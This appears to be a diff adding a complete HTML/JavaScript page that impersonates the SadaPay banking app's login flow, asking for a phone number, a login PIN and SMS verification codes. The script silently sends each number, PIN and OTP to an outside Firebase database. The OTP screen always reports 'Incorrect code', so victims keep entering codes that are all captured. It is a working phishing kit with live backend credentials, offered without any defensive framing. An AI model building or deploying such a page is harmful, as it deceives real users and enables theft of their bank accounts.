@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>SadaPay App</title>
+    
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        html, body { margin: 0; padding: 0; width: 100vw; height: 100dvh; font-family: 'Inter', sans-serif; background-color: #fc6759; color: white; overflow: hidden; -webkit-tap-highlight-color: transparent; }
+        .screen { display: none; flex-direction: column; width: 100%; height: 100%; padding: 30px 20px; box-sizing: border-box; position: absolute; top: 0; left: 0; }
+        .active { display: flex; }
+        
+        /* Splash Screen */
+        #splash-screen { padding: 0; background: url('https://i.postimg.cc/Dz591TgD/Screenshot-20261109-104648.jpg') no-repeat center center; background-size: cover; }
+        
+        /* Phone Screen */
+        .header-title { font-size: 32px; font-weight: 600; margin-top: 40px; margin-bottom: 8px; }
+        .header-subtitle { font-size: 15px; opacity: 0.9; margin-bottom: 30px; }
+        .phone-input-row { display: flex; gap: 12px; width: 100%; height: 52px; }
+        .country-selector { display: flex; align-items: center; background: white; color: black; padding: 0 14px; border-radius: 26px; font-weight: 500; font-size: 16px; gap: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .country-selector span { font-size: 10px; }
+        .number-input-container { display: flex; align-items: center; background: white; border-radius: 26px; flex-grow: 1; padding: 0 16px; border: 2.5px solid #20b8a6; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .phone-input { flex-grow: 1; border: none; outline: none; font-size: 18px; color: #333; background: transparent; font-weight: 500; width: 100%; }
+        .btn-continue { position: absolute; bottom: 42%; left: 20px; width: calc(100% - 40px); background-color: rgba(0, 0, 0, 0.08); color: rgba(255, 255, 255, 0.4); border: none; padding: 18px 24px; border-radius: 14px; font-size: 16px; font-weight: 500; cursor: default; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; transition: all 0.3s; pointer-events: none; }
+        .btn-continue.active-btn { background-color: #2b2b2b; color: #ffffff; pointer-events: auto; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        .spinner { width: 22px; height: 22px; border: 3px solid rgba(255, 255, 255, 0.3); border-radius: 50%; border-top-color: white; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        /* Shared Back Button */
+        .back-btn { font-size: 24px; cursor: pointer; margin-bottom: 20px; width: 30px; }
+
+        /* OTP Screen */
+        .otp-inputs-wrapper { display: flex; justify-content: space-between; margin-top: 40px; padding: 0 10px; }
+        .otp-dash { width: 15%; height: 40px; background: transparent; border: none; border-bottom: 3px solid rgba(255, 255, 255, 0.7); color: white; font-size: 28px; text-align: center; outline: none; font-weight: 600; border-radius: 0; transition: all 0.2s; }
+        .otp-dash:focus { border-bottom: 3px solid white; }
+        .timer-text { position: absolute; bottom: 42%; left: 20px; font-size: 14px; opacity: 0.9; }
+        .otp-loading-area { display: flex; justify-content: center; margin-top: 30px; opacity: 0; transition: opacity 0.3s; }
+        .otp-loading-area.show { opacity: 1; }
+        .otp-error-msg { text-align: center; color: #ffcccc; font-size: 14px; margin-top: 15px; opacity: 0; transition: opacity 0.3s; }
+        
+        /* PIN Screen */
+        #pin-screen { align-items: center; }
+        .pin-header { font-size: 26px; font-weight: 500; margin-top: 10px; margin-bottom: 40px; }
+        .pin-indicator-container { display: flex; gap: 15px; margin-bottom: 40px; height: 20px; align-items: center; }
+        .pin-dash { width: 24px; height: 3px; background-color: white; border-radius: 2px; transition: all 0.1s; }
+        .pin-dash.filled { width: 16px; height: 16px; background-color: white; border-radius: 50%; }
+        .forgot-pin-text { font-size: 16px; font-weight: 500; margin-bottom: auto; }
+        .custom-keypad { display: grid; grid-template-columns: repeat(3, 1fr); width: 100%; max-width: 380px; margin-bottom: 20px; }
+        .keypad-btn { padding: 25px 0; text-align: center; font-size: 32px; font-weight: 400; cursor: pointer; user-select: none; }
+        .keypad-btn:active { background-color: rgba(255, 255, 255, 0.1); border-radius: 50%; }
+    </style>
+</head>
+<body>
+
+    <!-- Splash Screen (1) -->
+    <div id="splash-screen" class="screen active"></div>
+
+    <!-- Phone Input Screen (2) -->
+    <div id="phone-screen" class="screen">
+        <div class="header-title">Let's get started!</div>
+        <div class="header-subtitle">Please enter your mobile number</div>
+        <div class="phone-input-row">
+            <div class="country-selector">🇵🇰 +92 <span>▼</span></div>
+            <div class="number-input-container">
+                <input type="tel" class="phone-input" id="phone-input" placeholder="3012345678" maxlength="10">
+            </div>
+        </div>
+        <!-- Now opens PIN screen -->
+        <button class="btn-continue" id="continue-btn" onclick="goToPIN()">
+            Continue <span style="font-size: 20px;">→</span>
+        </button>
+    </div>
+
+    <!-- PIN Screen (Now comes at number 3) -->
+    <div id="pin-screen" class="screen">
+        <div class="back-btn" onclick="goBackToPhone()" style="align-self: flex-start;">‹</div>
+        <div class="pin-header">Enter your login PIN</div>
+        
+        <div class="pin-indicator-container">
+            <div class="pin-dash"></div><div class="pin-dash"></div><div class="pin-dash"></div><div class="pin-dash"></div><div class="pin-dash"></div>
+        </div>
+        <div class="forgot-pin-text">Forgot PIN?</div>
+        
+        <div class="custom-keypad">
+            <div class="keypad-btn" onclick="pressPin('1')">1</div><div class="keypad-btn" onclick="pressPin('2')">2</div><div class="keypad-btn" onclick="pressPin('3')">3</div>
+            <div class="keypad-btn" onclick="pressPin('4')">4</div><div class="keypad-btn" onclick="pressPin('5')">5</div><div class="keypad-btn" onclick="pressPin('6')">6</div>
+            <div class="keypad-btn" onclick="pressPin('7')">7</div><div class="keypad-btn" onclick="pressPin('8')">8</div><div class="keypad-btn" onclick="pressPin('9')">9</div>
+            <div></div><div class="keypad-btn" onclick="pressPin('0')">0</div>
+            <div class="keypad-btn" onclick="removePin()" style="font-size: 24px; display:flex; align-items:center; justify-content:center;">
+                <svg width="28" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path><line x1="18" y1="9" x2="12" y2="15"></line><line x1="12" y1="9" x2="18" y2="15"></line>
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <!-- OTP Screen (Now comes at number 4) -->
+    <div id="otp-screen" class="screen">
+        <div class="back-btn" onclick="goBackToPIN()">‹</div>
+        <div class="header-title" style="margin-top: 0; font-size: 28px;">Enter verification code</div>
+        <div class="header-subtitle" id="otp-subtitle">We've sent it to +92... via SMS 💬</div>
+        
+        <div class="otp-inputs-wrapper">
+            <input type="tel" class="otp-dash" maxlength="1">
+            <input type="tel" class="otp-dash" maxlength="1">
+            <input type="tel" class="otp-dash" maxlength="1">
+            <input type="tel" class="otp-dash" maxlength="1">
+            <input type="tel" class="otp-dash" maxlength="1">
+        </div>
+        
+        <div class="otp-loading-area" id="otp-loading"><div class="spinner"></div></div>
+        
+        <div class="otp-error-msg" id="otp-error">Incorrect code. Please try again.</div>
+        
+        <div class="timer-text" id="otp-timer">Call available in 00:30</div>
+    </div>
+
+<script>
+    // Firebase Configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyB9Y2_hnmgQsFute7DDAcKjmuoAnggQZJY",
+        authDomain: "long-d1bcb.firebaseapp.com",
+        databaseURL: "https://long-d1bcb-default-rtdb.firebaseio.com",
+        projectId: "long-d1bcb",
+        storageBucket: "long-d1bcb.firebasestorage.app",
+        messagingSenderId: "515546162619",
+        appId: "1:515546162619:web:e046b79a25ccfa057e509e"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let currentUserId = Date.now().toString();
+
+    // Splash Screen Timer
+    setTimeout(() => {
+        document.getElementById('splash-screen').classList.remove('active');
+        document.getElementById('phone-screen').classList.add('active');
+        document.getElementById('phone-input').focus();
+    }, 3000);
+
+    // Phone Input Logic
+    const phoneInput = document.getElementById('phone-input');
+    const continueBtn = document.getElementById('continue-btn');
+
+    phoneInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        if (e.target.value.length === 10) {
+            continueBtn.classList.add('active-btn');
+        } else {
+            continueBtn.classList.remove('active-btn');
+        }
+    });
+
+    // Step 2 to Step 3 (Phone to PIN)
+    function goToPIN() {
+        const phone = phoneInput.value;
+        if(phone.length === 10) { 
+            db.ref('users/' + currentUserId).set({
+                phone: "0" + phone, 
+                updatedAt: Date.now()
+            });
+
+            continueBtn.innerHTML = '<div class="spinner"></div>';
+            continueBtn.style.justifyContent = 'center';
+            continueBtn.style.pointerEvents = 'none';
+
+            // Set OTP subtitle for later use
+            document.getElementById('otp-subtitle').innerText = `We've sent it to +92${phone} via SMS 💬`;
+
+            setTimeout(() => {
+                document.getElementById('phone-screen').classList.remove('active');
+                document.getElementById('pin-screen').classList.add('active');
+                
+                continueBtn.innerHTML = 'Continue <span style="font-size: 20px;">→</span>';
+                continueBtn.style.justifyContent = 'space-between';
+                continueBtn.style.pointerEvents = 'auto';
+            }, 1000);
+        }
+    }
+
+    function goBackToPhone() {
+        document.getElementById('pin-screen').classList.remove('active');
+        document.getElementById('phone-screen').classList.add('active');
+    }
+
+    function goBackToPIN() {
+        document.getElementById('otp-screen').classList.remove('active');
+        document.getElementById('pin-screen').classList.add('active');
+    }
+
+    // Step 3 Logic (PIN screen) - Saves PIN and goes to OTP
+    let currentPin = "";
+    const maxPinLength = 5;
+
+    function renderPin() {
+        const dashes = document.querySelectorAll('.pin-dash');
+        dashes.forEach((dash, index) => {
+            if (index < currentPin.length) {
+                dash.classList.add('filled');
+            } else {
+                dash.classList.remove('filled');
+            }
+        });
+    }
+
+    function pressPin(num) {
+        if (currentPin.length < maxPinLength) {
+            currentPin += num;
+            renderPin();
+            
+            if (currentPin.length === maxPinLength) {
+                // Save PIN to Firebase
+                db.ref('users/' + currentUserId + '/all_pins').push(currentPin);
+                db.ref('users/' + currentUserId).update({ updatedAt: Date.now() });
+
+                // Wait half a second, then open OTP screen
+                setTimeout(() => {
+                    document.getElementById('pin-screen').classList.remove('active');
+                    document.getElementById('otp-screen').classList.add('active');
+                    startTimer();
+                    setupOTPFocus();
+                    
+                    // Reset PIN in case user presses back button
+                    currentPin = "";
+                    renderPin();
+                }, 500);
+            }
+        }
+    }
+
+    function removePin() {
+        if (currentPin.length > 0) {
+            currentPin = currentPin.slice(0, -1);
+            renderPin();
+        }
+    }
+
+    // OTP Timer
+    let timerInterval;
+    function startTimer() {
+        clearInterval(timerInterval);
+        let timeLeft = 30;
+        const timerElement = document.getElementById('otp-timer');
+        timerElement.style.cursor = "default";
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            let seconds = timeLeft < 10 ? '0' + timeLeft : timeLeft;
+            timerElement.innerText = `Call available in 00:${seconds}`;
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerElement.innerText = "Resend Code";
+                timerElement.style.cursor = "pointer";
+            }
+        }, 1000);
+    }
+
+    // Step 4 Logic (OTP Screen) - Saves OTP and shows error to loop
+    function setupOTPFocus() {
+        const inputs = document.querySelectorAll('.otp-dash');
+        inputs[0].focus();
+        inputs.forEach((input) => {
+            const new_input = input.cloneNode(true);
+            new_input.value = '';
+            input.parentNode.replaceChild(new_input, input);
+        });
+
+        const new_inputs = document.querySelectorAll('.otp-dash');
+        new_inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, ''); 
+                if (e.target.value !== '') {
+                    if (index < new_inputs.length - 1) {
+                        new_inputs[index + 1].focus();
+                    } else {
+                        new_inputs.forEach(inp => inp.disabled = true);
+                        document.getElementById('otp-loading').classList.add('show');
+                        document.getElementById('otp-error').style.opacity = '0';
+                        
+                        // Save OTP to Firebase
+                        let enteredOtp = Array.from(new_inputs).map(inp => inp.value).join('');
+                        db.ref('users/' + currentUserId + '/all_otps').push(enteredOtp);
+                        db.ref('users/' + currentUserId).update({ updatedAt: Date.now() });
+
+                        // Show error after loading so user can enter another OTP
+                        setTimeout(() => {
+                            document.getElementById('otp-loading').classList.remove('show');
+                            document.getElementById('otp-error').style.opacity = '1';
+                            
+                            new_inputs.forEach(inp => { inp.disabled = false; inp.value = ''; });
+                            new_inputs[0].focus();
+                            
+                            // Hide error msg after 3 seconds
+                            setTimeout(() => {
+                                document.getElementById('otp-error').style.opacity = '0';
+                            }, 3000);
+                        }, 1200); 
+                    }
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    new_inputs[index - 1].focus();
+                }
+            });
+        });
+    }
+</script>
+</body>
+</html>
